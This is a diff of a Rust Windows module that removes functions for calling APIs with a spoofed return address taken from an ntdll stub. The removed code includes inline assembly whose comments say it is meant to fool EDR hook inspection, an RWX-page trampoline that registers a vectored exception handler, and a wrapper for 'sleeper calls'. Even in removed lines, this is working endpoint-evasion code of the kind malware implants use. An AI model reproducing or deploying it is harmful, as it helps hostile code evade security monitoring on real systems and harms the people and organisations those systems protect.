@@ -44,8 +44,6 @@
 
 #![cfg(target_os = "windows")]
 
-use core::ffi::c_void;
-
 // ---- Public API -----------------------------------------------------------
 
 /// A return-address stub found in ntdll's `.text` — an `ADD RSP, imm8; RET`
@@ -151,178 +149,6 @@ unsafe fn scan_for_stub(
     None
 }
 
-/// Call a function with a spoofed return address on the stack, so EDR inline
-/// hooks that inspect `[RSP]` see the caller as a legitimate ntdll address.
-///
-/// # Arguments
-/// - `stub`: pre-scanned return-address stub in ntdll
-/// - `target`: the function to call
-/// - `arg1..arg4`: up to 4 arguments (the x64 max in registers)
-///
-/// # Safety
-/// - `target` must be a valid function with the standard `extern "system"`
-///   calling convention taking `usize` arguments.
-/// - `stub.stack_clean` must match the actual stack layout (typically 0x20
-///   for the 4-arg shadow space + optional extra args on stack).
-/// - The target function MUST use `ret` (not `ret imm16`), since the stub
-///   already handles stack cleanup.
-///
-/// # CET Compatibility
-/// This uses `call` (not `jmp`) so the shadow stack records the real return
-/// address. The target function's `ret` pops from both stacks. The stub's
-/// `ret` also pops from both stacks. **Shadow-stack-compatible.**
-pub unsafe fn call_with_spoofed_return_4(
-    stub: ReturnStub,
-    target: unsafe extern "system" fn(usize, usize, usize, usize) -> usize,
-    a1: usize,
-    a2: usize,
-    a3: usize,
-    a4: usize,
-) -> usize {
-    let fake_ret = stub.addr;
-    // adjust = stack_clean — the stub's `ADD RSP, stack_clean` pops these
-    // bytes, then `RET` pops the `after_call` return point we pushed.
-    let adjust: usize = stub.stack_clean as usize;
-    let result: usize;
-
-    // Stack (top→bottom) after jmp target:
-    //   [RSP+0x00] = fake_ret      ← callee's RET pops
-    //   [RSP+0x08] = adjust bytes  ← stub's ADD RSP pops
-    //   [RSP+0x08+adjust] = 2f    ← stub's RET pops → back to our code
-    //   ... saved regs + orig ret addr ...
-    core::arch::asm!(
-        "pushq %rbx",
-        "pushq %rbp",
-        "pushq %rdi",
-        "pushq %rsi",
-        "pushq %r12",
-        "pushq %r13",
-        "pushq %r14",
-        "pushq %r15",
-        "movq {a1}, %rcx",
-        "movq {a2}, %rdx",
-        "movq {a3}, %r8",
-        "movq {a4}, %r9",
-        "subq {adjust}, %rsp",
-        "call 99f",
-        "99:",
-        "popq %rax",
-        "addq $14, %rax",
-        "pushq %rax",
-        "push {fake_ret}",
-        "movq {target}, %rax",
-        "jmp *%rax",
-        "98:",
-        "addq {adjust}, %rsp",
-        "popq %r15",
-        "popq %r14",
-        "popq %r13",
-        "popq %r12",
-        "popq %rsi",
-        "popq %rdi",
-        "popq %rbp",
-        "popq %rbx",
-        a1 = in(reg) a1,
-        a2 = in(reg) a2,
-        a3 = in(reg) a3,
-        a4 = in(reg) a4,
-        target = in(reg) target as usize,
-        fake_ret = in(reg) fake_ret,
-        adjust = in(reg) adjust,
-        lateout("rax") result,
-        options(att_syntax),
-    );
-    result
-}
-
-///
-/// `AddVectoredExceptionHandler` takes 2 args: `First: u32` (1 = front of
-/// chain, 0 = back) and `Handler: PVECTORED_EXCEPTION_HANDLER`.
-/// The handler's signature is `extern "system" fn(*mut EXCEPTION_POINTERS) -> LONG`.
-///
-/// Returns the VEH handle (null on failure).
-///
-/// # Safety
-/// `handler` must be a valid VEH handler function.
-/// `stub` must point to a valid `ADD RSP, X; RET` in ntdll with
-/// `stack_clean >= 8` (the 2 shadow args + return address = 0x10 minimum).
-pub unsafe fn add_vectored_handler_spoofed(
-    stub: ReturnStub,
-    first: usize,
-    handler: unsafe extern "system" fn(usize) -> i32,
-) -> *mut c_void {
-    // Build a raw-byte trampoline that calls AddVectoredExceptionHandler
-    // with a spoofed return address (ntdll RET stub).
-    let aveh = match crate::resolve::export_addr(b"kernelbase.dll", b"AddVectoredExceptionHandler")
-        .or_else(|| crate::resolve::export_addr(b"kernel32.dll", b"AddVectoredExceptionHandler"))
-    {
-        Some(a) => a,
-        None => return core::ptr::null_mut(),
-    };
-
-    // Build the trampoline thunk.
-    let thunk = crate::caller_spoof_thunk::build(
-        stub.addr,        // ntdll RET stub (fake return address)
-        aveh,             // AddVectoredExceptionHandler
-        first,            // arg1: First (1 = front)
-        handler as usize, // arg2: Handler fn ptr
-        0,                // arg3: unused
-        0,                // arg4: unused
-    );
-
-    // Allocate RWX page for the trampoline.
-    let nt_alloc = match crate::resolve::export_addr(b"ntdll.dll", b"NtAllocateVirtualMemory") {
-        Some(a) => a,
-        None => return core::ptr::null_mut(),
-    };
-    type NtAlloc =
-        unsafe extern "system" fn(usize, *mut *mut c_void, usize, *mut usize, u32, u32) -> i32;
-    let alloc: NtAlloc = core::mem::transmute(nt_alloc);
-    let mut page: *mut c_void = core::ptr::null_mut();
-    let mut sz: usize = 0x1000;
-    let st = alloc(!0usize, &mut page, 0, &mut sz, 0x3000, 0x40); // RWX
-    if st < 0 || page.is_null() {
-        return core::ptr::null_mut();
-    }
-
-    // Copy thunk bytes.
-    core::ptr::copy_nonoverlapping(thunk.bytes.as_ptr(), page as *mut u8, thunk.len);
-
-    // Execute the trampoline — returns the VEH handle in RAX.
-    let thunk_fn: unsafe extern "system" fn() -> usize = core::mem::transmute(page);
-    let handle = thunk_fn();
-
-    // Free the page.
-    let nt_free = match crate::resolve::export_addr(b"ntdll.dll", b"NtFreeVirtualMemory") {
-        Some(a) => a,
-        None => {
-            return handle as *mut c_void;
-        }
-    };
-    type NtFree = unsafe extern "system" fn(usize, *mut *mut c_void, *mut usize, u32) -> i32;
-    let free: NtFree = core::mem::transmute(nt_free);
-    let mut fsz: usize = 0;
-    free(!0usize, &mut page, &mut fsz, 0x8000);
-
-    handle as *mut c_void
-}
-
-/// Generic wrapper: call any 2-arg `extern "system"` function with a spoofed
-/// return address. Useful for one-off sleeper calls.
-///
-/// # Safety
-/// Same as `call_with_spoofed_return_4` but with 2 meaningful args.
-pub unsafe fn call_2arg_spoofed(
-    stub: ReturnStub,
-    target_addr: usize,
-    a1: usize,
-    a2: usize,
-) -> usize {
-    let target_fn: unsafe extern "system" fn(usize, usize, usize, usize) -> usize =
-        core::mem::transmute(target_addr);
-    call_with_spoofed_return_4(stub, target_fn, a1, a2, 0, 0)
-}
-
 // ---- PE header types (minimal, for section walk) --------------------------
 
 #[repr(C)]
@@ -340,11 +166,6 @@ struct ImageFileHeader {
     size_of_optional_header: u16,
     _characteristics: u16,
 }
-
-// NOTE: ImageNtHeaders64 is NOT used for section-offset calculation.
-// The correct section offset is:
-//   e_lfanew + 4 (signature) + 20 (FILE_HEADER) + size_of_optional_header
-// Using struct size would be wrong because OptionalHeader varies by arch.
 
 #[repr(C)]
 struct ImageSectionHeader {
